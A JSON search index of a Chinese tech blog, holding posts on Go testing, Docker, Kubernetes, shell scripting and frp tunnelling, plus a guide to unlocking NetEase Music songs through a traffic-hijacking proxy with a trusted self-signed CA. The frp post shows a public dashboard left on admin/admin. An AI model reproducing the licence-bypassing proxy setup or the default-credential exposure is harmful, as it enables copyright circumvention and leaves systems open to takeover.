vcs)\nPOWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(status ip anaconda node_version go_version)\n```\n\n\n\n### 4. 参考资料\n\n+ https://github.com/romkatv/powerlevel10k\n+ https://www.liuvv.com/p/6600d67c.html\n\n","tags":["iterm2"],"categories":["iterm2"]},{"title":"golang测试单个文件或函数","url":"%2Fp%2F401250d7.html","content":"\n### 1. 测试单个文件或函数\n\n测试一个文件\n\n```bash\ngo test -v hello_test.go\n```\n\n\n\n测试一个函数\n\n```bash\ngo test -v  -test.run=\"TestA\"  \n```\n\n<!-- more -->\n\n注意在测试单个文件时, 会出现未定义的情况, 这是因为定义在其他文件里, 需要加上定义的文件.\n\n```bash\ngo test -v hello.go hello_test.go\n```\n\n\n\n而测试单个函数不存在这个问题, 可以在一个文件内用相同的前缀命名测试函数, 然后用正则表达式去测试.\n\n如:\n\n```bash\ngo test -v  -test.run=\"TestA*\"  \n```\n\n\n\n### 2. 测试覆盖率\n\n```bash\ngo test -v -coverprofile=a.out -test.run=\"TestA*\" # 把测试结果保存在 a.out\n\ngo tool cover -html=./a.out  # 通过浏览器打开, 可以看到覆盖经过的函数\n```\n\n\n\n### 3. 总结\n\n不写单元测试的代码都是耍流氓.","tags":["golang"],"categories":["golang"]},{"title":"解锁网易云音乐灰色歌曲并试听","url":"%2Fp%2F3a9129d9.html","content":"\n\n\n### 0. 前言\n\n谈起音乐软件, 只钟情网易云音乐. 奈何版权太少, 歌单里好多音乐涉及到版权的问题无法听, 即使开了VIP也不行.\n\n但是我们可以通过一些“奇淫技巧”来实现解锁灰色无版权歌曲，效果比开了黑胶VIP 还要强大.\n\n声明：本工具只提供大家免费测试学习使用，请勿用作任何商业用途。\n\n<!-- more -->\n\n### 1. 项目介绍\n\nhttps://github.com/nondanee/UnblockNeteaseMusic\n\n其原理是通过流量进入代理后来匹配网易链接进行劫持，然后将requests请求修改重新发送一个新的链接（这个链接就是provider的），请求到音乐以后再重新将provider的response改写成网易的，然后返回到应用，通俗的说是修改http请求和响应。\n\n整个配置参考了这个项目,  唯一不足的是教程散落在仓库的各大 issue. 因为只常用 ios 和 mac 的设备,所以只测试了这两个平台, 上测试效果图:\n\n![1](解锁网易云音乐灰色歌曲并试听/2.jpg)\n\n![2](解锁网易云音乐灰色歌曲并试听/1.jpg)\n\n\n\n\n\n### 2. 配置\n\n把项目下载到云服务器上, 直接 node app.js 即可运行. 因为 ios 和 mac 平台的特殊性, 需要加一些参数,参考下面配置.\n\n\n\n##### 2.1 先给域名加个解析\n\n我这里给 music.liuvv.com 解析到云服务器ip\n\n\n\n##### 2.2 启动systemctl 配置\n\n ```\n[Unit]\nDescription=music\nAfter=network.target\n[Service]\nExecStart=/usr/bin/node /opt/UnblockNeteaseMusic/app.js -e https://music.liuvv.com -s -p 8080:8081\nRestart=always\nRestartSec=5\n[Install]\nWantedBy=default.target\n ```\n\n这里启动的参数格式是 node app.js -e 域名 -s -p  http端口:https端口\n\n\n\n##### 2.2 nginx 配置\n\n```nginx\nserver {\n  listen 443;\n  server_name music.liuvv.com; # 改为自己的域名\n\n  ssl on;\n  ssl_certificate /etc/nginx/ssl/music/cert.pem; # 改为自己申请得到的 crt 文件的名称\n  ssl_certificate_key /etc/nginx/ssl/music/key.pem; # 改为自己申请得到的 key 文件的名称\n  ssl_session_timeout 5m;\n  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n  ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;\n  ssl_prefer_server_ciphers on;\n\n  location / {\n    proxy_pass http://localhost:8080; # 转发\n  }\n}\n```\n\n\n\n这里`ssl_certificate`和`ssl_certificate_key` 需要用 acme.sh 生成证书.\n\n https://github.com/acmesh-official/acme.sh\n\n```bash\nacme.sh --installcert -d music.liuvv.com \\ \n--key-file       /etc/nginx/ssl/music/key.pem  \\ \n--fullchain-file /etc/nginx/ssl/music/cert.pem \n```\n\n\n\n### 3. ios 使用\n\n教程散落在这个 issue  https://github.com/nondanee/UnblockNeteaseMusic/issues/65\n\n+ 去美区 appstore, 下载个小火箭\n\n- 右上角加号添加节点\n- 类型选择 HTTP\n- 服务器填写你的服务器公网 IP\n- 端口填写你启动服务的端口号（默认为 8080）\n- 然后底部找到配置 点击本地文件 -> default.conf -> 编辑配置\n- 添加三条规则 选项选择你刚刚添加的节点\n  - `USER-AGENT`: `NeteaseMusic*`\n  - `DOMAIN-SUFFIX`: `163.com`\n  - `DOMAIN-SUFFIX`: `126.net`\n\n+ 打开网易云, 搜索周杰伦\n\n\n\n### 4. mac 使用\n\nmac 因为最新版本的原因(我的版本2.3.2 (832)),  需要通过自签证书解决https 请求.\n\n教程散落在这个 issue https://github.com/nondanee/UnblockNeteaseMusic/issues/48\n\n\n\n+ 安装仓库内的 CA证书到系统钥匙链, 并始终信任. \n+ 在系统偏好设置里, 网络->代理->自动代理配置里, 填写 url  `http://公网ip:8080/proxy.pac`\n+ 打开网易云, 搜索周杰伦\n\n\n\n### 5. windows使用\n\nwindows 和 ios 不通用, 可以开启两个进程, 监听不同的端口\n\nhttps://github.com/nondanee/UnblockNeteaseMusic/issues/478\n\n\n\n### 6. 一边科学上网一边\n\n在 mac下, 虽然可以通过系统代理达到目的, 但还是建议走代理软件. \n\n我用的是 clashX, 先上 mac 的 clashX 配置\n\n```yaml\nport: 7890\nsocks-port: 7891\nallow-lan: false\nmode: Rule\nlog-level: silent\nexternal-controller: 127.0.0.1:9090\n\ndns:\n  enable: true\n  listen: 0.0.0.0:53\n  enhanced-mode: fake-ip\n  nameserver:\n   - 119.29.29.29\n   - 223.5.5.5\n\nProxy:\n- name: \"UnblockMusic\"\n  type: http\n  server: 公网ip\n  port: 8080\n\nProxy Group:\n- name: \"Netease Music\"\n  type: select\n  proxies: \n    - UnblockMusic\n    - DIRECT\n\nRule:\n# Unblock Netease Music\n- DOMAIN,api.iplay.163.com,Netease Music\n- DOMAIN,apm3.music.163.com,Netease Music\n- DOMAIN,apm.music.163.com,Netease Music\n- DOMAIN,interface3.music.163.com,Netease Music\n- DOMAIN,interface.music.163.com,Netease Music\n- DOMAIN,music.163.com,Netease Music\n- DOMAIN,music.126.net,Netease Music\n- DOMAIN-SUFFIX,163yun.com,Netease Music\n- DOMAIN-SUFFIX,mam.netease.com,Netease Music\n- DOMAIN-SUFFIX,hz.netease.com,Netease Music\n\n# CIDR规则\n- IP-CIDR,39.105.63.80/32,Netease Music\n- IP-CIDR,45.254.48.1/32,Netease Music\n- IP-CIDR,47.100.127.239/32,Netease Music\n- IP-CIDR,59.111.160.195/32,Netease Music\n- IP-CIDR,59.111.160.197/32,Netease Music\n- IP-CIDR,59.111.181.35/32,Netease Music\n- IP-CIDR,59.111.181.38/32,Netease Music\n- IP-CIDR,59.111.181.60/32,Netease Music\n- IP-CIDR,101.71.154.241/32,Netease Music\n- IP-CIDR,103.126.92.132/32,Netease Music\n- IP-CIDR,103.126.92.133/32,Netease Music\n- IP-CIDR,112.13.119.17/32,Netease Music\n- IP-CIDR,112.13.122.1/32,Netease Music\n- IP-CIDR,115.236.118.33/32,Netease Music\n- IP-CIDR,115.236.121.1/32,Netease Music\n- IP-CIDR,118.24.63.156/32,Netease Music\n- IP-CIDR,193.112.159.225/32,Netease Music\n- IP-CIDR,223.252.199.66/32,Netease Music\n- IP-CIDR,223.252.199.67/32,Netease Music\n- IP-CIDR,59.111.21.14/31,Netease Music\n- IP-CIDR,59.111.179.214/32,Netease Music\n- IP-CIDR,59.111.238.29/32,Netease Music\n\n# Advertising\n- DOMAIN,admusicpic.music.126.net,REJECT\n- DOMAIN,iadmat.nosdn.127.net,REJECT\n- DOMAIN,iadmusicmat.music.126.net,REJECT\n- DOMAIN,iadmusicmatvideo.music.126.net,REJECT\n\n# Final\n- MATCH,DIRECT\n```\n\n启动这个配置再打开网易云, 加载速度就会特别丝滑. \n\n但是大多数情况下需要一边科学上网一边听歌, 所以只需要把上面这个 Rule 规则合并你翻墙的规则里即可. 因为有规则优先级的顺序问题, 需要把上述 Rule 配置放到自己的 Rule 配置前面.\n\n\n\n### 7. 参考资料\n\n+ https://github.com/nondanee/UnblockNeteaseMusic\n+ https://www.yfriend.xyz/155.html","tags":["音乐"],"categories":["音乐"]},{"title":"python爬虫项目在docker中的部署实践","url":"%2Fp%2Fdc81a411.html","content":"\n\n\n### 1. 选择镜像\n\n这里选择基础镜像时是有讲究. 一是应当尽量选择官方镜像库里的基础镜像；二是应当选择轻量级的镜像做底包.\n\n就典型的 Linux 基础镜像来说，大小关系如下：Ubuntu > CentOS > Debian> Alpine\n\nAlpine Docker 镜像也继承了 Alpine Linux 发行版的这些优势。相比于其他 Docker 镜像，它的容量非常小，仅仅只有 5 MB 左右（对比 Ubuntu 系列镜像接近 200 MB），且拥有非常友好的包管理机制apk。\n\n<!-- more -->\n\n### 2. 拷贝文件\n\n相对于 ADD,优先使用 COPY指令\n\n另外发现拷贝文件夹是把文件夹的内容拷贝进去, 而不是把整个目录拷贝进去, 坑爹 最后使用dockerignore解决这个问题.\n\n```dockerfile\ncopy . /zk8/\n```\n\n.dockerignore文件\n\n```\nchromedriver\n*.sh\n.*\n**/__pycache__/\nDockerfile\n```\n\n\n\n### 3. 测试 dockerfile\n\n##### 3.1 镜像加速\n\n在本地测试的时候, 发现连Alpine都拉取不下来, 此处感谢伟大的 great wall. 于是选择阿里云加速.\n\nhttps://cr.console.aliyun.com/cn-hangzhou/instances/mirrors\n\n右键点击桌面顶栏的 docker 图标，选择 Preferences ，在 Daemon 标签（Docker 17.03 之前版本为 Advanced 标签）下的 Registry mirrors 列表中\n\n将 https://xxxxxxxxx.mirror.aliyuncs.com 加到 \"registry-mirrors\" 的数组里，点击Apply & Restart 按钮，等待 Docker 重启并应用配置的镜像加速器。\n\nps: 就是阿里云加速, 在后续的安装软件中也是特别慢, 此处建议在云服务器上(免费的谷歌云)操作.\n\n##### 3.2 测试\n\n```bash\ndocker build -t zk8:0.1 .   #  制作 image\ndocker run -ti --rm zk8:0.1 /bin/sh   # 启动容器结束后删除, 用这种方法可以非常方便测试\n```\n\n前期可以通过 shell 进入到容器里面测试, 在里面尝试安装相应的软件包, 然后再写 dockerfile会比较方便\n\n\n\n### 4. 安装软件包\n\n爬虫用 python 写的, 并且使用了 selenium + 无头浏览器. 所以安装包要写在 dockerfile里, 文件如下:\n\n```dockerfile\nFROM alpine\n\nRUN mkdir -p /zk8\nCOPY . /zk8/\n\n# install python\nRUN echo \"**** install python ****\" && \\\n                apk add --no-cache python3 && \\\n                if [ ! -e /usr/bin/python ]; then ln -sf python3 /usr/bin/python ; fi && \\\n                echo \"**** install pip ****\" && \\\n                python3 -m ensurepip && \\\n                rm -r /usr/lib/python*/ensurepip && \\\n                pip3 install --no-cache --upgrade pip setuptools wheel && \\\n                if [ ! -e /usr/bin/pip ]; then ln -s pip3 /usr/bin/pip ; fi\n\n# install python package\nRUN apk add --no-cache py-lxml && \\\n                apk add --no-cache chromium && \\\n                apk add --no-cache chromium-chromedriver && \\\n                if [ -e /usr/bin/chromedriver ]; then ln -s /usr/bin/chromedriver /zk8/chromedriver ; fi && \\\n                pip install selenium && \\\n                pip install bearychat && \\\n                pip install pyquery\n\n\nWORKDIR /zk8\nCMD python3 main.py\n```\n\n\n\n### 5. 发布到 dockerhub\n\n建议建立自己的私有仓库, 因为 dockerhub 可以免费使用一个私有仓库, 此处上传到 dockerhub.\n\n```bash\ndocker login # 登录自己的 dockerhub 帐号\n\ndocker tag zk8:0.1 levonfly/zk8:0.1 # 此处打 tag, 格式要以 用户名/镜像名字:版本号\n\ndocker push levonfly/zk8:0.1 # 推送到 dockerhub\n```\n\ndockerhub 上还可以 link 到github, 即 github 一更新代码就重新 build.\n\n接下来就是激动人心的时刻, 在任何安装 docker 的机器上直接运行自己的爬虫.\n\n```bash\ndocker pull levonfly/zk8:0.1\ndocker run -d --name zk8 levonfly/zk8:0.1 \n```\n\n\n\n\n\n","tags":["docker"],"categories":["docker"]},{"title":"k8s的原理和实践","url":"%2Fp%2F40c9599.html","content":"\n\n\n# 0. 前言\n\n先来看一张 k8s 架构设计以及组件之间的通信协议\n\n![1](k8s实践/2.jpeg)\n\n\n\n+ Master 负责管理整个集群。Master 协调集群中的所有活动，例如调度应用、维护应用的所需状态、应用扩容以及推出新的更新。\n\n+ Node 是一个虚拟机或者物理机，它在 Kubernetes 集群中充当工作机器的角色。\n+ 在 Kubernetes 上部署应用时，您告诉 Master 启动应用容器。 Master 就编排容器在群集的 Node 上运行。 Node 使用 Master 暴露的 Kubernetes API 与 Master 通信。\n\n<!-- more -->\n\n\n下面是更抽象的一个视图：\n![1](k8s实践/3.png)\n\n\n\nMaster架构:\n![1](k8s实践/4.png)\n\n\n\nNode架构:\n![1](k8s实践/5.png)\n\n最后走一遍 k8s 官网的交互式教程, 能够快速的对 k8s 有一个简单的了解.\n\n\n\n# 1. kubectl \n\n+ kubectl version \n\n  client  version 是kubectl的版本\n\n  server version 是 k8s 的版本\n\n  \n\n+ kubectl get nodes\n\n  查看所有的 node 节点\n\n  \n\n+ kubectl get pods \n\n  查看 pod 节点\n\n  \n\n+ kubectl describe pods \n\n  查看 pod 状态, 例如 ip , 里面的容器之类的\n\n  \n\n+ kubectl describe services/kubernetes-bootcamp  \n\n  查看services状态\n\n  \n\n+ kubectl get services \n\n  查看services\n\n\n\n+ kubectl expose deployment/kubernetes-bootcamp --type=\"NodePort\" --port 8080  \n\n  新建 service 并暴露端口\n\n  \n\n+ kubectl delete service -l run=kubernetes-bootcamp  \n\n  删除一个 service\n\n\n\n+ kubectl create deployment  创建deployment\n\n  kubectl create deployment kubernetes-bootcamp --image=gcr.io/google-samples/kubernetes-bootcamp:v1\n\n  \n\n+ kubectl get deployments\n\n  获取deployments\n\n\n\n+ kubectl describe deployment \n\n  查看deployment\n\n  \n\n+ kubectl label pod $POD_NAME app=v1  \n\n  给 pod 加个 lable\n\n  \n\n+ kubectl get pods -l app=v1  \n\n  加完 lable 就能查看了\n\n  \n\n+ kubectl get rs \n\n  查看拷贝列表\n\n  \n\n+ kubectl scale deployments/kubernetes-bootcamp --replicas=2  \n\n  直接复制品,牛逼了\n\n  \n\n+ kubectl logs  查看日志\n\n  kubectl logs $POD_NAME\n\n  \n\n+ kubectl exec 执行命令\n\n  kubectl exec $POD_NAME env  查看环境变量\n\n  kubectl exec -ti $POD_NAME bash  进入到 pod 里面\n\n  \n\n+ kubectl set image deployments/kubernetes-bootcamp kubernetes-bootcamp=gcr.io/google-samples/kubernetes-bootcamp:v10\n\n  更换 image\n\n  \n\n+ kubectl rollout status deployments/kubernetes-bootcamp \n\n  查看状态\n\n  \n\n+ kubectl rollout undo deployments/kubernetes-bootcamp  \n\n  回滚\n\n\n\n\n\n# 2. 问题记录\n\n+ minikube是干啥的?\n\n   minikube 是一种轻量级的 Kubernetes 实现，可在本地计算机上创建 VM 并部署仅包含一个节点的简单集群。\n\n  简单理解为一个运行在本地Node，我们可以在里面创建Pods来创建对应的服务.\n\n\n\n+ deployment和 pods的关系\n\n  pod是单一亦或一组容器的合集, deployment是pod版本管理的工具 用来区分不同版本的pod, 可以回滚版本\n\n  单独创建pod的时候就不会有deployment出现，但是创建deployment的时候一定会创建pod,因为pod是一个基础的单位。\n\n\n\n\n\n# 3. 参考资料\n\n+ https://kubernetes.io/zh/docs/tutorials/hello-minikube/\n+ https://www.bookstack.cn/read/kubernetes-handbook/concepts-index.md\n\n","tags":["k8s"],"categories":["k8s"]},{"title":"shell读取文件内容遇到的坑","url":"%2Fp%2F67723314.html","content":"\n文件内容如下, 需要把1234读取赋值给shell内部的变量nodeid\n\n```\ncat a.conf\nnodeid 1234\n```\n\n<!-- more -->\n\nshell解析文件如下\n\n```shell\n#!/bin/sh\n\nnodeid=0\n\n\nset_nodeid1(){\n\tcat a.conf | while read line\n\tdo\n\t\tif [[ $line == nodeid* ]];\n\t\tthen\n\t\t\t nodeid=${line:7}\n\t\tfi\n\tdone\n}\n\nset_nodeid2(){\n\tfor line in `cat a.conf`\n\tdo\n\t\tif [[ $line == nodeid* ]];\n\t\tthen\n\t\t\t nodeid=${line:7}\n\t\tfi\n\tdone\n}\n\nset_nodeid3(){\n\twhile read -r line\n\tdo\n\t\tif [[ $line == nodeid* ]];\n\t\tthen\n\t\t\t nodeid=${line:7}\n\t\tfi\n\tdone < a.conf\n}\n\n\nset_nodeid1\necho \"set_nodeid1 is $nodeid\"\nset_nodeid2\necho \"set_nodeid2 is $nodeid\"\nset_nodeid3\necho \"set_nodeid3 is $nodeid\"\n```\n\n\n\n输出内容如下:\n\n```bash\nset_nodeid1 is 0\nset_nodeid2 is\nset_nodeid3 is 1234\n```\n\n\n\n第一种方式创建了子shell, 赋值是子shell的, 没有影响到全局变量.\n\n第二种方式, for循环的方式, 因为a.conf中间空格导致的,把一行循环了两次, 所以赋值了空\n\n第三种方式得到正确的结果\n\n","tags":["shell"],"categories":["shell"]},{"title":"k8s的初探","url":"%2Fp%2F890e8359.html","content":"\n### 0. 前言\n\nKubernetes中的大部分概念Node、Pod、Replication Controller、Service等都可以看作一种“资源对象”，几乎所有的资源对象都可以通过kubectl工具（API调用）执行增、删、改、查等操作并将其保存在etcd中持久化存储。从这个角度来看，kubernetes其实是一个高度自动化的资源控制系统，通过跟踪对比etcd库里保存的“资源期望状态”与当前环境中的“实际资源状态”的差异来实现自动控制和自动纠错的高级功能。\n\n<!-- more -->\n\n+ Master：集群控制管理节点，所有的命令都经由master处理。\n\n+ Node：是kubernetes集群的工作负载节点。Master为其分配工作，当某个Node宕机时，Master会将其工作负载自动转移到其他节点。\n\n+ Pod：是kubernetes最重要也是最基本的概念。每个Pod都会包含一个 “根容器”，还会包含一个或者多个紧密相连的业务容器。\n\n+ Label：是一个key=value的键值对，其中key与value由用户自己指定。可以附加到各种资源对象上，一个资源对象可以定义任意数量的Label。可以通过LabelSelector（标签选择器）查询和筛选资源对象。\n\n\n\n### 1. Kubernetes 本地安装\n\n我们需要安装以下东西：Kubernetes 的命令行客户端 kubctl、一个可以在本地跑起来的 Kubernetes 环境 Minikube。\n\n#### 1.1 安装 kub\n\n```bash\ncat <<EOF > /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=1\nrepo_gpgcheck=1\ngpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\nexclude=kube*\nEOF\n\n\n\nyum install -y kubelet kubeadm kubectl --disableexcludes=kubernetes\nsystemctl enable kubelet && systemctl start kubelet\n```\n\n\n\n#### 1.2 安装 minikube\n\n```bash\ncurl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 \\\n   && sudo install minikube-linux-amd64 /usr/local/bin/minikube\n   \n   \nminikube start --vm-driver=none --image-repository=registry.cn-hangzhou.aliyuncs.com/google_containers\n```\n\n\n\n为什么增加后面的image-repository, 因为GFW总是会在无形中增加学习的难度. 请参考: https://github.com/kubernetes/minikube/issues/3860\n\n\n\nminikube 启动时会自动配置 kubectl，把它指向 Minikube 提供的 Kubernetes API 服务。可以用下面的命令确认：\n\n```bash\n$ kubectl config current-context\nminikube\n```\n\n\n\n### 2. 使用\n\n典型的 Kubernetes 集群包含一个 master 和多个 node。每个 node 上运行着维护 node 状态并和 master 通信的 kubelet。作为一个开发和测试的环境，Minikube 会建立一个有一个 node 的集群，用下面的命令可以看到：\n\n```bash\n$ kubectl get nodes\nNAME       STATUS    AGE       VERSION\nminikube   Ready     1h        v1.10.0\n```\n\n\n\n#### 2.1 创建 docker 容器\n\n```bash\nmkdir html\necho '<h1>Hello Kubernetes!</h1>' > html/index.html\n```\n\n\n\n`Dockerfile`\n\n```dockerfile\nFROM nginx\nCOPY html/* /usr/share/nginx/html\n```\n\n创建:\n\n```bash\ndocker build -t k8s-demo:0.1 .\n```\n\n\n\n#### 2.2 创建pod\n\n`pod.yml`\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n    name: k8s-demo\n    labels:\n     app: k8s-demo\nspec:\n    containers:\n        - name: k8s-demo\n          image: k8s-demo:0.1\n          ports:\n              - containerPort: 80\n```\n创建:\n\n```bash\nkubectl create -f pod.yml\n \n\nkubectl get pods\n# NAME       READY     STATUS    RESTARTS   AGE\n# k8s-demo   1/1       Running   0          5s\n\n\n# 修改 pod.yml, 并应用\nkubectl apply -f pod.yml\n```\n\n\n\n虽然这个 pod 在运行，我们无法从外部直接访问。要把服务暴露出来，我们需要创建一个 Service。Service 的作用有点像建立了一个反向代理和负载均衡器，负责把请求分发给后面的 pod。\n\n#### 2.3 创建service\n\n`svc.yaml`\n\n```yaml\napiVersion: v1\nkind: Service\nmetadata:\n    name: k8s-demo-svc\n    labels:\n        app: k8s-demo\nspec:\n    type: NodePort\n    ports:\n        - port: 80\n          nodePort: 30050\n    selector:\n        app: k8s-demo\n```\n\n这个 service 会把容器的 80 端口从 node 的 30050 端口暴露出来。\n\n注意文件最后两行的 selector 部分，这里决定了请求会被发送给集群里的哪些 pod。这里的定义是所有包含「app: k8s-demo」这个标签的 pod。\n\n\n\n查看标签命令:\n\n```bash\nkubectl describe pods | grep Labels\n```\n\n\n\n创建:\n\n```bash\nkubectl create -f svc.yml\n```\n\n\n\n用下面的命令可以得到暴露出来的 URL，在浏览器里访问，就能看到我们之前创建的网页了。\n\n```bash\nminikube service k8s-demo-svc --url\n# http://10.0.0.5:30050\n\ncurl http://10.0.0.5:30050\n# Hello Kubernetes!\n```\n\n\n\n#### 2.4 创建 deployment\n\n在正式环境中我们需要让一个服务不受单个节点故障的影响，并且还要根据负载变化动态调整节点数量，所以不可能像上面一样逐个管理 pod。\n\nKubernetes 的用户通常是用 Deployment 来管理服务的。一个 deployment 可以创建指定数量的 pod 部署到各个 node 上，并可完成更新、回滚等操作。\n\n`deployment.yml`\n\n```yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k8s-demo-deployment\nspec:\n  replicas: 10\n  minReadySeconds: 10\n  strategy:\n    type: RollingUpdate\n    rollingUpdate:\n      maxUnavailable: 1\n      maxSurge: 1\n  template:\n    metadata:\n      labels:\n        app: k8s-demo\n    spec:\n      containers:\n        - name: k8s-demo-pod\n          image: k8s-demo:0.1\n          ports:\n            - containerPort: 80\n  selector:\n    matchLabels:\n      app: k8s-demo\n```\n\n创建:\n\n```bash\nkubectl create -f deployment.yml\n\n# 用下面的命令可以看到这个 deployment 的副本集（replica set），有 10 个 pod 在运行。\n\nkubectl get rs\n# NAME                             DESIRED   CURRENT   READY     AGE\n# k8s-demo-deployment-774878f86f   10        10        10        19s\n```\n\n\n\n假设我们对项目做了一些改动，要发布一个新版本。这里作为示例，我们只把 HTML 文件的内容改一下, 然后构建一个新版镜像 k8s-demo:0.2：\n\n```bash\necho '<h1>Hello Kubernetes22222222222!</h1>' > html/index.html\ndocker build -t k8s-demo:0.2 .\n\n# 替换 deployment.yml 的 tag 值\n\n# 重新应用 deployment\nkubectl apply -f deployment.yml --record=true\n```\n\n\n\n此时我们访问\n\n```bash\ncurl http://10.0.0.5:30050\n# Hello Kubernetes22222222222!\n```\n\n\n\n回滚版本1\n\n``` bash\nkubectl rollout undo deployment k8s-demo-deployment --to-revision=1\n\n# 可以查看回滚进度\nkubectl rollout status deployment k8s-demo-deployment\n```\n\n\n\n再次访问\n\n```bash\ncurl http://10.0.0.5:30050\n# Hello Kubernetes!\n```\n\n\n\n### 3. 总结\n\n+ 容器(可以不是 docker) 放在 pod 里面\n+ pod 增加了标签后, service 可以管理\n\n\n\n### 4. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/39937913\n","tags":["k8s"],"categories":["k8s"]},{"title":"frp内网穿透的实践","url":"%2Fp%2Fcc6fa0e8.html","content":"\n\n\n### 0. 为什么内网穿透\n\n从公网中访问自己的私有设备向来是一件难事儿。\n\n自己的主力台式机、NAS等等设备，它们可能处于路由器后，或者运营商因为IP地址短缺不给你分配公网IP地址。如果我们想直接访问到这些设备（远程桌面，远程文件，SSH等等），一般来说要通过一些转发或者P2P组网软件的帮助。\n\n<!-- more -->\n\n\n\n### 1. 安装配置 frp\n\nhttps://github.com/fatedier/frp/releases 下载最新的release\n\n##### 1.1服务端配置\n\n```bash\nsudo cp systemd/frps.service /lib/systemd/system/\n\n#  /usr/bin/frps -c /etc/frp/frps.ini\n# 我们按照 service 内的配置把文件拷贝到相应的地方\n\nsudo cp frps /usr/bin/frps\nsudo mkdir /etc/frp/\nsudo cp frps.ini /etc/frp/frps.ini\n\n# 编辑frps.ini\n\n\n# 开启 service\nsudo systemctl start frps\nsudo systemctl enable frps\n```\n\n\n\n##### 1.2 客户端\n\n```bash\nsudo cp systemd/frpc.service /lib/systemd/system/\n\nsudo cp frpc /usr/bin/frpc\nsudo mkdir /etc/frp/\nsudo cp frpc.ini /etc/frp/frpc.ini\n\n#编辑frpc.ini\n\n#1. 修改server_addr为服务端公网IP\n\n\n# 开启 service\nsudo systemctl start frpc\nsudo systemctl enable frpc\n```\n\n\n\n##### 1.3 测试\n\n主题frpc里面有ssh配置, 所以我们通过 ssh 访问内网机器：\n\n```bash\nssh -p 6000 root@49.234.15.70\n\n# 为了方便, 我们可以在~/.ssh/config 配置下面的话\n\nhost box\n    Hostname 49.234.15.70\n    Port 6000\n    user root\n```\n\n\n\n### 2. 自定义域名访问内网的 web 服务\n\n有时想要让其他人通过域名访问或者测试我们在本地搭建的 web 服务，但是由于本地机器没有公网 IP，无法将域名解析到本地的机器，通过 frp 就可以实现这一功能，以下示例为 http 服务，https 服务配置方法相同， vhost_http_port 替换为 vhost_https_port， type 设置为 https 即可。\n\n\n\n##### 2.1 修改 frps.ini\n\n设置 http 访问端口为 8080：\n\n```ini\n# frps.ini\n[common]\nbind_port = 7000\nvhost_http_port = 8080\n```\n\n\n\n##### 2.2 启动 frps：\n\n```bash\nsudo systemctl start frps\n```\n\n\n\n##### 2.3 修改frpc.ini\n\n修改 frpc.ini 文件，假设 frps 所在的服务器的 IP 为 x.x.x.x，local_port 为本地机器上 web 服务对应的端口, 绑定自定义域名 `www.yourdomain.com`:\n\n\n\n```ini\n# frpc.ini\n[common]\nserver_addr = x.x.x.x\nserver_port = 7000\n\n[web]\ntype = http\nlocal_port = 80\ncustom_domains = www.yourdomain.com\n```\n\n\n\n##### 2.4 启动 frpc：\n\n```bash\nsudo systemctl start frpc\n```\n\n\n\n##### 2.5 绑定域名映射\n\n将 `www.yourdomain.com` 的域名 A 记录解析到 IP `x.x.x.x`，如果服务器已经有对应的域名，也可以将 CNAME 记录解析到服务器原先的域名。\n\n通过浏览器访问 `http://www.yourdomain.com:8080` 即可访问到处于内网机器上的 web 服务。\n\n\n\n### 3. frp 管理面板\n\n服务端 frps 配置如下:\n\n```ini\n[common]\nbind_port = 7000\ndashboard_port = 5000\ndashboard_user = admin\ndashboard_pwd = admin\nvhost_http_port = 5001\n```\n\n然后我们通过 ip:5000,即可以访问到 web 管理界面.\n\n\n\n### 4. nginx 反向代理进行无端口访问\n\n##### 4.1 frp 相应配置\n\n+ frps\n\n  ```ini\n  [common]\n  bind_port = 7000\n  dashboard_port = 5000\n  dashboard_user = admin\n  dashboard_pwd = admin\n  vhost_http_port = 5001\n  ```\n\n  \n\n+ frpc\n\n  ```ini\n  [web]\n  type = http\n  local_port = 80\n  custom_domains = box.frp.liuvv.com\n  ```\n\n\n\n##### 4.2 在服务端架设 nginx\n\n1、 frp.liuvv.com 做A记录，解析至IP；\n\n2、 *.frp.liuvv.com 做CNAME记录，解析至 frp.liuvv.com;\n\n3、 配置nginx反向代理,将来自*.frp.liuvv.com的80端口请求，分发至frp服务器http请求的监听端口。\n\n```nginx\nserver {\n\n    listen 80;\n\n    server_name frp.liuvv.com;\n\n    location / {\n\n        proxy_pass http://127.0.0.1:5000;# dashboard\n\n        proxy_set_header    Host            $host:80;\n\n        proxy_set_header    X-Real-IP       $remote_addr;\n\n        proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;\n\n        proxy_hide_header   X-Powered-By;\n\n    }\n\n}\n\nserver {\n\n    listen 80;\n\n    server_name *.frp.liuvv.com;\n\n    access_log /var/log/nginx/frp_access.log;\n\n    error_log /var/log/nginx/frp_error.log;\n\n    location / {\n\n        proxy_pass http://127.0.0.1:5001;# vhost_http\n\n        proxy_set_header    Host            $host:80;\n\n        proxy_set_header    X-Real-IP       $remote_addr;\n\n        proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;\n\n        proxy_hide_header   X-Powered-By;\n\n    }\n\n}\n```\n\n\n\n### 5.  远程桌面连接局域网mac\n\nmac去下载darwin_amd64,  然后启动客户端 frpc\n\n##### 5.1  开启屏幕共享\n\n在系统设置->共享->开启屏幕共享\n\n即开启了 vnc 服务\n\n\n\n##### 5.2 修改frpc配置\n\n```ini\n[common] \nserver_addr = 49.234.15.70\nserver_port = 7000\n\n[vnc] \ntype = tcp \nlocal_ip = 127.0.0.1 \nlocal_port = 5900 \nremote_port = 35900 \nuse_encryption = true \nuse_compression = true\n```\n\n\n\n##### 5.3 连接远程\n\n在 finder, cmd+k, 进行连接\n\n```ini\nvnc://49.234.15.70:35900\n```\n\n\n\n### 6. 参考资料:\n\n+ https://github.com/fatedier/frp/blob/master/README_zh.md\n\n+ https://www.iyuu.cn/archives/286/\n+ 